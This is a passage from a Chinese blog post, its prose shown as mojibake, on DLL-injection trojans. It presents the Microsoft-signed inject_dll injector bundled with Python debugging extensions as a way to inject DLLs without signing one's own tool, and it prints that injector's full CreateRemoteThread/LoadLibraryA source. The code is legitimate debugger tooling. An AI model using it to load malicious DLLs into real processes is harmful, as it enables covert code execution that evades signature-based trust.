href=#dll-æ³¨å…¥å¼æœ¨é©¬>#</a></h2><h3 id=è®¤è¯†>è®¤è¯†<a hidden class=anchor aria-hidden=true href=#è®¤è¯†>#</a></h3><p>DLLæ³¨å…¥å³é€šè¿‡æ³¨å…¥å™¨å‘æ­£åœ¨è¿è¡Œä¸­çš„ç¨‹åºæ³¨å…¥æ–°çš„DLLï¼Œä½¿å…¶è‡ªåŠ¨è°ƒç”¨è¯¥DLLä»è€Œè§¦å‘DLLä¸­çš„åŠŸèƒ½ã€‚DLLè¢«åŠ è½½åˆ°è¿›ç¨‹åä¼šè‡ªåŠ¨è¿è¡ŒDllMain()å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥æŠŠæƒ³æ‰§è¡Œçš„ä»£ç æ”¾åˆ°DllMain()å‡½æ•°ï¼Œæ¯å½“åŠ è½½DLLæ—¶ï¼Œæ·»åŠ çš„ä»£ç å°±ä¼šè‡ªç„¶è€Œç„¶å¾—åˆ°æ‰§è¡Œã€‚åˆ©ç”¨è¯¥ç‰¹æ€§å¯ä¿®å¤ç¨‹åºBug,æˆ–å‘ç¨‹åºæ·»åŠ æ–°åŠŸèƒ½ã€‚æ­£å¸¸å¸¸è§äºè°ƒè¯•ã€åŠŸèƒ½æ‹“å±•ã€è‡ªåŠ¨åŒ–ç­‰ï¼›ä½†è‹¥æ³¨å…¥æ¶æ„çš„DLLåˆ™å¯å¯¼è‡´ç¨‹åºæ‰§è¡Œæ”»å‡»è€…çš„æ¶æ„ä»£ç ã€‚</p><p>æœ¬ç¯‡æ–‡ç« æºè‡ªäºå€¾æ—‹å¤§ä½¬å¯¹vscode pythonè°ƒè¯•æ‹“å±•åŒ…å†…å«æœ‰çš„ä¸¤ä¸ªdllæ³¨å…¥å™¨ <code>inject_dll_x86.exe</code> ä¸<code>inject_dll_amd64.exe</code>çš„ç ”ç©¶ã€‚åœ¨è¯¥æ‹“å±•ä¸­ï¼Œè¿˜è‡ªå¸¦äº†è¯¥æ³¨å…¥å™¨çš„æºä»£ç ã€‚è¯¥dllæ³¨å…¥å™¨å·²ç»å¸¦æœ‰å¾®è½¯ä¸‰æ–¹ç»„ä»¶çš„ç­¾åï¼Œé€šè¿‡å¯¹è¯¥dllæ³¨å…¥å™¨çš„ç ”ç©¶ï¼Œå¯ä»¥å®ç°å¯¹åº”ç”¨çš„å…ç­¾dllæ³¨å…¥ã€‚</p><p>å…¶å®è¯¥dllæ³¨å…¥å™¨åœ¨å„ç§pythonæ‹“å±•åŒ…ä¸­ä¹Ÿè‡ªå¸¦æœ‰ï¼Œæ¯”å¦‚æˆ‘çš„pycharm</p><p><img loading=lazy src=/postPic/image-20240816144919905.png alt=åŠ è½½å¤±è´¥!></p><p>æ‰“å¼€è·¯å¾„ï¼Œåœ¨åŒè·¯å¾„çš„windowsæ–‡ä»¶å¤¹é‡Œå¯æ‰¾åˆ°æºä»£ç inject_dll.cpp</p><h3 id=æºä»£ç >æºä»£ç <a hidden class=anchor aria-hidden=true href=#æºä»£ç >#</a></h3><h4 id=inject_dllcpp><code>inject_dll.cpp</code><a hidden class=anchor aria-hidden=true href=#inject_dllcpp>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;conio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;tchar.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;tlhelp32.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;kernel32.lib&#34;)
</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;user32.lib&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// Helper to free data when we leave the scope.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>DataToFree</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>hProcess</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>snapshotHandle</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>LPVOID</span> <span class=n>remoteMemoryAddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>remoteMemorySize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>DataToFree</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>hProcess</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>snapshotHandle</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemoryAddr</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemorySize</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=o>~</span><span class=n>DataToFree</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=k>this</span><span class=o>-&gt;</span><span class=n>hProcess</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemoryAddr</span> <span class=o>!=</span> <span class=k>nullptr</span> <span class=o>&amp;&amp;</span> <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemorySize</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>VirtualFreeEx</span><span class=p>(</span><span class=k>this</span><span class=o>-&gt;</span><span class=n>hProcess</span><span class=p>,</span> <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemoryAddr</span><span class=p>,</span> <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemorySize</span><span class=p>,</span> <span class=n>MEM_RELEASE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemoryAddr</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>-&gt;</span><span class=n>remoteMemorySize</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>CloseHandle</span><span class=p>(</span><span class=k>this</span><span class=o>-&gt;</span><span class=n>hProcess</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>-&gt;</span><span class=n>hProcess</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=k>this</span><span class=o>-&gt;</span><span class=n>snapshotHandle</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=n>CloseHandle</span><span class=p>(</span><span class=k>this</span><span class=o>-&gt;</span><span class=n>snapshotHandle</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>-&gt;</span><span class=n>snapshotHandle</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * All we do here is load a dll in a remote program (in a remote thread).
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Arguments must be the pid and the dll name to run.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * i.e.: inject_dll.exe &lt;pid&gt; &lt;dll path&gt;
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>wmain</span><span class=p>(</span> <span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>wchar_t</span> <span class=o>*</span><span class=n>argv</span><span class=p>[</span> <span class=p>],</span> <span class=kt>wchar_t</span> <span class=o>*</span><span class=n>envp</span><span class=p>[</span> <span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Running executable to inject dll.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Helper to clear resources.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>DataToFree</span> <span class=n>dataToFree</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Expected 2 arguments (pid, dll name).&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>_wtoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Invalid pid.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>int</span> <span class=n>MAX_PATH_SIZE_PADDED</span> <span class=o>=</span> <span class=n>MAX_PATH</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>dllPath</span><span class=p>[</span><span class=n>MAX_PATH_SIZE_PADDED</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dllPath</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=n>MAX_PATH_SIZE_PADDED</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>pathLen</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>wcstombs_s</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pathLen</span><span class=p>,</span> <span class=n>dllPath</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>MAX_PATH</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>bool</span> <span class=n>inheritable</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>HANDLE</span> <span class=n>hProcess</span> <span class=o>=</span> <span class=n>OpenProcess</span><span class=p>(</span><span class=n>PROCESS_VM_OPERATION</span> <span class=o>|</span> <span class=n>PROCESS_CREATE_THREAD</span> <span class=o>|</span> <span class=n>PROCESS_VM_READ</span> <span class=o>|</span> <span class=n>PROCESS_VM_WRITE</span> <span class=o>|</span> <span class=n>PROCESS_QUERY_INFORMATION</span><span class=p>,</span> <span class=n>inheritable</span><span class=p>,</span> <span class=n>pid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>hProcess</span> <span class=o>==</span> <span class=k>nullptr</span> <span class=o>||</span> <span class=n>hProcess</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Unable to open process with pid: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;. Error code: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>dataToFree</span><span class=p>.</span><span class=n>hProcess</span> <span class=o>=</span> <span class=n>hProcess</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;OpenProcess with pid: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>LPVOID</span> <span class=n>remoteMemoryAddr</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>,</span> <span class=n>MAX_PATH_SIZE_PADDED</span><span class=p>,</span> <span class=n>MEM_RESERVE</span> <span class=o>|</span> <span class=n>MEM_COMMIT</span><span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>remoteMemoryAddr</span> <span class=o>==</span> <span class=k>nullptr</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Error. Unable to allocate memory in pid: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;. Error code: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>dataToFree</span><span class=p>.</span><span class=n>remoteMemorySize</span> <span class=o>=</span> <span class=n>MAX_PATH_SIZE_PADDED</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>dataToFree</span><span class=p>.</span><span class=n>remoteMemoryAddr</span> <span class=o>=</span> <span class=n>remoteMemoryAddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;VirtualAllocEx in pid: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>bool</span> <span class=n>written</span> <span class=o>=</span> <span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>remoteMemoryAddr</span><span class=p>,</span> <span class=n>dllPath</span><span class=p>,</span> <span class=n>pathLen</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>written</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Error. Unable to write to memory in pid: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;. Error code: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;WriteProcessMemory in pid: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>LPVOID</span> <span class=n>loadLibraryAddress</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPVOID</span><span class=p>)</span> <span class=n>GetProcAddress</span><span class=p>(</span><span class=n>GetModuleHandle</span><span class=p>(</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>),</span> <span class=s>&#34;LoadLibraryA&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>loadLibraryAddress</span> <span class=o>==</span> <span class=k>nullptr</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Error. Unable to get LoadLibraryA address. Error code: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;loadLibraryAddress: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>pid</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>HANDLE</span> <span class=n>remoteThread</span> <span class=o>=</span> <span class=n>CreateRemoteThread</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span> <span class=n>loadLibraryAddress</span><span class=p>,</span> <span class=n>remoteMemoryAddr</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>remoteThread</span> <span class=o>==</span> <span class=k>nullptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Error. Unable to CreateRemoteThread. Error code: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// We wait for the load to finish before proceeding to get the function to actually do the attach.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Waiting for LoadLibraryA to complete.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>result</span> <span class=o>=</span> <span class=n>WaitForSingleObject</span><span class=p>(</span><span class=n>remoteThread</span><span class=p>,</span> <span class=mi>5</span> <span class=o>*</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>result</span> <span class=o>==</span> <span class=n>WAIT_TIMEOUT</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;WaitForSingleObject(LoadLibraryA thread) timed out.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=n>result</span> <span class=o>==</span> <span class=n>WAIT_FAILED</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;WaitForSingleObject(LoadLibraryA thread) failed. Error code: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Ok, finished dll injection.&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
